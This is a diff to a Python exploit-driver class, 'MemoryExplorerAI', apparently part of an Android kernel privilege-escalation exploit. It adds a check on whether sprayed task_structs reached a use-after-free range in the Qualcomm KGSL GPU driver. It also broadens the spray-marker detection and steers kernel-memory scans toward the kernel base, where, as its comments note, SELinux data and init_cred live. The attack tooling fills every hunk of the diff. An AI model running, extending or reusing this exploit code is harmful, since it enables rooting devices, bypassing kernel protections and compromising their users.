@@ -1603,6 +1603,23 @@ class MemoryExplorerAI:
                 continue
             idle_count = 0
             if "SCAN_DONE" in line:
+                try:
+                    stats_part = line.split("SCAN_DONE", 1)[1]
+                    kv = {}
+                    for part in stats_part.split(":"):
+                        if "=" in part:
+                            k, v = part.split("=", 1)
+                            kv[k] = v
+                    reads   = int(kv.get("r", "0"))
+                    failed  = int(kv.get("f", "0"))
+                    empty   = int(kv.get("e", "0"))
+                    nonzero = int(kv.get("n", "0"))
+                    hits    = int(kv.get("h", "0"))
+                    self.live["last_msg"] = (
+                        f"AUTO: scan done r={reads} f={failed} e={empty} "
+                        f"n={nonzero} h={hits}")
+                except Exception:
+                    pass
                 break
             if "PROGRESS:" in line:
                 try:
@@ -2026,6 +2043,24 @@ class MemoryExplorerAI:
                     if not line:
                         continue
                     if "SCAN_DONE" in line:
+                        # Parse diagnostic stats: SCAN_DONE:r=X:f=Y:e=Z:n=A:h=B
+                        try:
+                            stats_part = line.split("SCAN_DONE", 1)[1]
+                            kv = {}
+                            for part in stats_part.split(":"):
+                                if "=" in part:
+                                    k, v = part.split("=", 1)
+                                    kv[k] = v
+                            reads   = int(kv.get("r", "0"))
+                            failed  = int(kv.get("f", "0"))
+                            empty   = int(kv.get("e", "0"))
+                            nonzero = int(kv.get("n", "0"))
+                            hits    = int(kv.get("h", "0"))
+                            self.live["last_msg"] = (
+                                f"S: SCAN_DONE read={reads} failed={failed} "
+                                f"empty={empty} nonzero={nonzero} hits={hits}")
+                        except Exception:
+                            self.live["last_msg"] = "Scan complete."
                         break
                     if "PROGRESS:" in line:
                         try:
@@ -2265,16 +2300,72 @@ class MemoryExplorerAI:
                 self.learn_stats["batches"] += 1
             time.sleep(0.2)
 
+            # 1b. Diagnostic: read 1 page from each of our scan sub-range
+            # slice and check if the spray actually made it into the UAF
+            # range. If reads return all-zero or non-KETO* data, the spray
+            # task_structs aren't reaching KGSL pages and we need to
+            # adjust uaf_start or the spray technique.
+            try:
+                if not self._engine_write(
+                        f"read {hex(scan_start)}\n".encode()):
+                    pass
+                else:
+                    test_data = self._read_data_packet()
+                    if test_data and len(test_data) >= 4096:
+                        # Check for any KETO* / KETW* / comm pattern
+                        hits_in_test = []
+                        for marker in (b"KETO", b"KETW"):
+                            i = 0
+                            while True:
+                                i = test_data.find(marker, i)
+                                if i < 0:
+                                    break
+                                if (i + 7 < len(test_data)
+                                    and test_data[i+4] in b"0123456789"
+                                    and test_data[i+5] in b"0123456789"
+                                    and test_data[i+6] in b"0123456789"
+                                    and test_data[i+7] in b"0123456789"):
+                                    hits_in_test.append(
+                                        test_data[i:i+8].decode(errors="ignore"))
+                                i += 1
+                        with self.stats_lock:
+                            if hits_in_test:
+                                self.live["last_msg"] = (
+                                    f"W{worker_id}: spray IN RANGE "
+                                    f"(test page has {hits_in_test[:3]})")
+                            else:
+                                # Don't spam — only complain every 3rd
+                                # batch to avoid log noise.
+                                if self.learn_stats["batches"] % 3 == 0:
+                                    self.live["last_msg"] = (
+                                        f"W{worker_id}: spray NOT in "
+                                        f"range (test page has no markers, "
+                                        f"nz={sum(1 for b in test_data if b)}/4096)")
+            except Exception as e:
+                pass
+
             # 2) SCAN this subworker's range (adaptive if kbase known)
             if not self.ensure_engine():
                 continue
             # Adaptive: if we already know kbase, focus on the kbase
-            # region \u2014 every subworker scans a slice of that.
+            # region \u2014 every subworker scans a slice of that. The kbase
+            # region is 32MB wide and is where SELinux, init_cred, and
+            # kernel text data live.
             if self.kernel_base:
                 kb_chunk = 0x2000000 // LEARN_WORKERS
                 s_start = self.kernel_base + kb_chunk * worker_id
                 s_end   = s_start + kb_chunk
+            elif self.knowledge_base.get("candidate_kbases"):
+                # Use first candidate kbase as fallback. Even if
+                # verify didn't lock it in, this gives us a direction
+                # to scan.
+                cand = int(self.knowledge_base["candidate_kbases"][0], 16)
+                kb_chunk = 0x2000000 // LEARN_WORKERS
+                s_start = cand + kb_chunk * worker_id
+                s_end   = s_start + kb_chunk
             else:
+                # No kbase known yet — scan the UAF range where
+                # spray task_structs should appear.
                 s_start, s_end = scan_start, scan_end
             with self.stats_lock:
                 self.live["scan_total"]   = s_end - s_start
@@ -2311,6 +2402,25 @@ class MemoryExplorerAI:
                         scan_done = True
                         with self.stats_lock:
                             self.live["scan_total"] = 0
+                        # Parse diagnostic stats: SCAN_DONE:r=X:f=Y:e=Z:n=A:h=B
+                        try:
+                            stats_part = line.split("SCAN_DONE", 1)[1]
+                            kv = {}
+                            for part in stats_part.split(":"):
+                                if "=" in part:
+                                    k, v = part.split("=", 1)
+                                    kv[k] = v
+                            reads   = int(kv.get("r", "0"))
+                            failed  = int(kv.get("f", "0"))
+                            empty   = int(kv.get("e", "0"))
+                            nonzero = int(kv.get("n", "0"))
+                            hits    = int(kv.get("h", "0"))
+                            self.live["last_msg"] = (
+                                f"W{worker_id}: SCAN_DONE "
+                                f"read={reads} failed={failed} empty={empty} "
+                                f"nonzero={nonzero} hits={hits}")
+                        except Exception:
+                            pass
                         break
                     if "PROGRESS:" in line:
                         try:
@@ -2449,19 +2559,49 @@ class MemoryExplorerAI:
 
     def _is_real_task_struct(self, data):
         """Heuristic: is this a real task_struct page?
-        Strong indicators: KETO0422 (our spray) OR KET00422 (v6.c spray
-        — note the missing 0), OR com.android., OR comm string at
-        one of the well-known task_struct offsets.
+        Strong indicators: any KETO* spray marker (KETO + 4 digits),
+        any KETW* marker (KETW + digit + 3 digits), KETO0422 (legacy
+        master), KET00422 (v6.c spray), com.android., or any 16-byte
+        ASCII comm string at one of the well-known task_struct offsets.
         data can be a single 4KB page OR a 3-page triple (12288 bytes)
         from read_with_neighbors — in which case offsets 0x718..0x728
-        cover 3 possible page-alignment positions."""
+        cover 3 possible page-alignment positions.
+        """
         if not data or len(data) < 0x1000:
             return False
-        # Both KETO0422 (our spray) and KET00422 (v6.c) are accepted
-        if data.find(b"KETO0422") >= 0:
-            return True
-        if data.find(b"KET00422") >= 0:
-            return True
+        # Quick byte-pattern check for any of our KETO*/KETW* spray
+        # markers. This is much faster than the offset loop and is
+        # the path the C engine takes as well (sig 1a-1d).
+        for marker in (b"KETO0422", b"KET00422"):
+            if data.find(marker) >= 0:
+                return True
+        # KETO + 4 digits (KETO0330, KETO1234, KETO9999, etc.)
+        # Fast path: look for "KETO" then check 4 trailing digits.
+        idx = 0
+        while True:
+            idx = data.find(b"KETO", idx)
+            if idx < 0:
+                break
+            if (idx + 7 < len(data)
+                and data[idx+4] in b"0123456789"
+                and data[idx+5] in b"0123456789"
+                and data[idx+6] in b"0123456789"
+                and data[idx+7] in b"0123456789"):
+                return True
+            idx += 1
+        # KETW + digit + 3 digits (KETW0031, KETW1100, KETW2009)
+        idx = 0
+        while True:
+            idx = data.find(b"KETW", idx)
+            if idx < 0:
+                break
+            if (idx + 7 < len(data)
+                and data[idx+4] in b"012"
+                and data[idx+5] in b"0123456789"
+                and data[idx+6] in b"0123456789"
+                and data[idx+7] in b"0123456789"):
+                return True
+            idx += 1
         if data.find(b"com.android.") >= 0:
             return True
         # comm at 0x718 (kernel 5.4) OR marker at 0xfd8 (v6.c) — printable
@@ -2551,13 +2691,44 @@ class MemoryExplorerAI:
         """Less strict: does this page have ANY non-trivial data?
         Returns (interesting, reason, confidence). Expanded for Linux 5.4
         kernel memory patterns: real comm strings, kernel pointer density,
-        cred-struct u32 layout, ascii runs."""
+        cred-struct u32 layout, ascii runs.
+
+        Also detects our spray markers (KETO*/KETW*) — those are
+        unambiguously our task_struct pages, so we tag them with high
+        confidence even if the C engine missed them (e.g. because the
+        scan was killed before its sig-1 reached the page)."""
         if not data or len(data) < 16:
             return (False, "too small", 0)
         # Count non-zero
         nonzero = sum(1 for b in data if b != 0)
         if nonzero < 16:
             return (False, f"mostly zero ({nonzero}/{len(data)})", 0)
+
+        # 0. Spray marker detection (KETO + 4 digits or KETW + 4 digits)
+        idx = 0
+        while True:
+            idx = data.find(b"KETO", idx)
+            if idx < 0:
+                break
+            if (idx + 7 < len(data)
+                and data[idx+4] in b"0123456789"
+                and data[idx+5] in b"0123456789"
+                and data[idx+6] in b"0123456789"
+                and data[idx+7] in b"0123456789"):
+                return (True, f"KETO spray @ 0x{idx:x} ({data[idx:idx+8]})", 90)
+            idx += 1
+        idx = 0
+        while True:
+            idx = data.find(b"KETW", idx)
+            if idx < 0:
+                break
+            if (idx + 7 < len(data)
+                and data[idx+4] in b"012"
+                and data[idx+5] in b"0123456789"
+                and data[idx+6] in b"0123456789"
+                and data[idx+7] in b"0123456789"):
+                return (True, f"KETW spray @ 0x{idx:x} ({data[idx:idx+8]})", 90)
+            idx += 1
 
         # A. Cred-struct pattern: u32 usage, then 6x u32 uid/gid/suid/sgid/euid/egid.
         #    For root cred all 6 are 0. For task_struct creds they may
